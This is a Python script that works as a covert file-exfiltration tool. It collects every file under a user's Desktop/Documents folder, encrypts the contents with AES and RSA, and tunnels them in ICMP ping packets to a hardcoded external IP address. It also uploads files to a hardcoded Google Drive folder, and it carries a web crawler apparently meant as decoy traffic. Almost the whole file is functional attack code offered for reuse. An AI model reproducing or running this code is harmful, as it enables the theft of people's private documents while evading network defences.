import socket 
import struct
import time
import re
import random
import requests
from multiprocessing import Process
from socket import htons
from time import sleep
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto import Random
from Crypto.Cipher import AES
from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive

import os

class Configuration:
  Min_URL_Depth = 5
  Max_URL_Depth = 10
  MAX_WAIT = 10
  MIN_WAIT = 3

  #Google websites to talk to
  ROOT_URLS = [
    "https://google.com",
    "https://sites.google.com",
    "https://support.google.com",
    "https://about.google/products/",
    "https://cloud.google.com/solutions/web-hosting "
  ]

  USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ' \
    'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'
  
class CrawlPage:

  def request(url):
    print("Requesting page")
    headers = {'user-agent':Configuration.USER_AGENT}

    try:
      r = requests.get(url= url, headers=headers, timeout=5)
    except:
      return False
    
    page_size = len(r.content)

    status = r.status_code
    if (status!=200):
      print("Bad")
      if (status == 429):
        sleep(10)
    else:
      print("Good request")

    return r
  
  def get_links(page):
    pattern = r"(?:href\=\")(https?:\/\/[^\"]+)(?:\")"
    links = re.findall(pattern, str(page.content))

    return links

  def recursive_browse(url,depth):
    # print("Recursively browsing [{}] ~~~ [depth = {}]".format(url, depth))
    if not depth:
      CrawlPage.request(url)
      return
    else:
      page = CrawlPage.request(url)
      print(page)
      format(url)
      try:
        valid_links = CrawlPage.get_links(page)
      except:
        print("Stopping, no links found")
        return
      #time.sleep(1) #To prevent from sending too much request at once

      try:
        CrawlPage.recursive_browse(random.choice(valid_links), depth-1)
      except:
        print("Jump out back to original loop")
        return
    
class Cipher:
  def encrypt(content):
    #Encrypting using AES first
    aeskey = Random.new().read(24)
    iv = Random.new().read(AES.block_size)    #To ensure that same value encrypted multiples times with same key will result in different value
    cipher = AES.new(aeskey,AES.MODE_CFB,iv)  #Cipher Feedback mode, allows block encryptor to be used as a stream cipher
    encryptedcontent = cipher.encrypt(content)        #Passing data packet to be encrypted

    #RSA Encryption portion 
    public_key = RSA.importKey(open("RSAkeys\public.pem").read())  #Retrieve our public key
    rsa = PKCS1_OAEP.new(public_key)
    cipherkey = rsa.encrypt(aeskey)                             #Encrypting the randomly generated 24 AES key
    
    return encryptedcontent, cipherkey, iv

#This Class calculates the checksum of a packet. Gets data and returns checksum answer. Based on python-ping tools ping.py 
class Checksum:
  def calculate(data: str) -> int:
    str_ = bytearray(data)
    csum = 0
    countTo = (len(str_) // 2) * 2
    
    for count in range(0, countTo, 2):
      thisVal = str_[count+1] * 256 + str_[count]
      csum = csum + thisVal
      csum = csum & 0xffffffff

    if countTo < len(str_):
      csum = csum + str_[-1]
      csum = csum & 0xffffffff

    csum = (csum >> 16) + (csum & 0xffff)
    csum = csum + (csum >> 16)
    answer = ~csum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

#This class constructs the payload
class Payload:
    HEADER_CONTENT= "bbHHh" # 6262484868
    ICMP_ECHO_REQUEST = 8

    #Building the payload here
    def __init__(self, header: bytes, data: bytes, id: int):
        self.header = header
        self.data = data
        self.id = id
    
    def build_basic_imcp_header (id: int, checksum = 0) -> bytes:
        return struct.pack(Payload.HEADER_CONTENT, Payload.ICMP_ECHO_REQUEST, 0, checksum, id, 1)

    def build_basic_imcp_data () -> bytes:
        return struct.pack("d", time.time())
        
    def build_payload(self, *data: bytes) -> bytes:
        for index, string in enumerate(data):
          self.data += string
        self.data, cipherkey , iv = Cipher.encrypt(self.data) #Encrypt using AES first then returning AES encrypted and RSA encrypted
        self.data += iv
        self.data += cipherkey
        #Appending Data at the back of the data portion

        #Calculating the checksum and building it with the header
        tempChecksum = Checksum.calculate(self.header + self.data)
        tempChecksum = htons(tempChecksum) & 0xffff
        self.header = Payload.build_basic_imcp_header(self.id, tempChecksum)

        return self.header + self.data 

class Pinger:
  MAX_SIZE = 1472         #ICMP packet data size is 1472

  def __init__(self, ipAddress: str):
    self.ipAddress = ipAddress
    # Creating Socket
    self.tunnel = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp")) 
    self.ID = os.getpid() & 0xFFFF

  #Function Path to find files
  def find_files(self, filename, search_path):
    result = []
    for root, dir, files in os.walk(search_path):
      for filename in files:
        file_path = os.path.join(root,filename)
        result.append(file_path)
  
    return result


  def sendPing(self, databytes):
      header = Payload.build_basic_imcp_header(self.ID)
      data = Payload.build_basic_imcp_data()
      payload = Payload(header, data, self.ID)
      
      print("[!]Ping sent succesfully to " + self.ipAddress)
      packet = payload.build_payload(
        databytes
      )
      self.tunnel.sendto(packet, (self.ipAddress,1))


  def prepareping(self) -> None:
    #Find files in a folder on desktop
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop/Documents') 
    steal = self.find_files("Documents",desktop)
    print(steal)

    #Checking how many items to exfiltrate in the DOCUMENTS folder on desktop
    for item in steal:
      #Count the number of packets we are going to send. File bytes/Data block in icmp 
      with open(f"{item}", 'rb') as f:
        contents = f.read()
        filebyteslength = len(contents)
      #Open file again and read it all. Need to be encoding into bytes
      with open(f"{item}", 'rb') as f:
        filename = f"<<<{os.path.basename(item)}>>>"
        filename = str.encode(filename)
        print(filename)

        bytes_read = filename 
        randnum = random.randrange(1000,Pinger.MAX_SIZE)
        bytes_read += f.read(randnum-len(filename)-128-16-8) #This ensures we append filename at the FIRST icmp packet
        filebyteslength -= (randnum-len(filename)-128-16-8)           #First packet deduction
        Pinger.sendPing(self, bytes_read)                             #First packet sending of ping

        #sleep(random.randint(1,3))  #Change accordingly to decrease intensity
        while filebyteslength >0:

          #If this is the last packet to send, then append the <<EOF>> bytes string at the end
          if (filebyteslength < 999):
            filebyteslength -= (randnum-128-16-8)
            randnum = random.randrange(1000,Pinger.MAX_SIZE)
            EOF_string = "<<<EOF>>>"
            bytes_read = f.read(randnum-128-16-8)
            bytes_read += str.encode(EOF_string)

          else:
            filebyteslength -= (randnum-128-16-8)
            randnum = random.randrange(1000,Pinger.MAX_SIZE)
            bytes_read = f.read(randnum-128-16-8) #Read the following bytes
            
          #sleep(random.randint(1,3))             #Change accordingly to decrease intensity
          Pinger.sendPing(self, bytes_read)       #Subsequent packets sending of ping

def uploadToDrive():
    gauth = GoogleAuth(settings_file='Auth/settings.yaml')           
    drive = GoogleDrive(gauth)  
    # Ensure that credentials.json and settings.yaml is in the same folder as this python file
    
    upload_file_list = []
    file_upload_path = 'Documents'

    # get the list of file name from a specified path
    for path in os.listdir(file_upload_path):
        upload_file_list.append(path)

    # upload each file within the path onto drive
    for upload_file in upload_file_list:
        gfile = drive.CreateFile({'parents': [{'id': '13mNFnqMcGiz0zH1LPyG9LU8Xk5ETZ_V6'}], 'title':upload_file})
        # Read file and set it as the content of this instance.
        gfile.SetContentFile(os.path.join(file_upload_path, upload_file))
        
        gfile.Upload() # Upload the file.

def CrawlLooper():
  try: 
    while True:
      url = random.choice(Configuration.ROOT_URLS)
      print(url)
      CrawlPage.recursive_browse(url,Configuration.Max_URL_Depth)
  except KeyboardInterrupt:
    print("Out")


#Main method. Hardcoded IP address and Google drive upload, replace with whatever you want.
if __name__ == "__main__":

  # Process(target=CrawlLooper).start()
  ip = "128.199.105.125"
  ipv6 = "2400:6180:0:d0::12c7:f001" #IPv6 addreess
  pinger = Pinger("128.199.105.125") 
  pinger.prepareping()
  uploadToDrive()
